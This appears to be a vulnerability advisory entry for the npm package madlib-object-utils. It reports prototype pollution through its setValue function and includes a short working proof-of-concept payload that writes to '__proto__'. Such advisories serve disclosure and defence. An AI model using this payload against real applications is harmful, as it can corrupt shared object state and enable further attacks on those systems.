  title: Prototype Pollution
  description: |
    [madlib-object-utils][1] is an A small set of utility functions for
    working with objects

    Affected versions of this package are vulnerable to Prototype Pollution
    via `setValue`.

    ### POC:   {#poc}

        const objectUtils = require("madlib-object-utils");
        objectUtils.setValue('__proto__.polluted', {}, true);
        console.log(polluted);



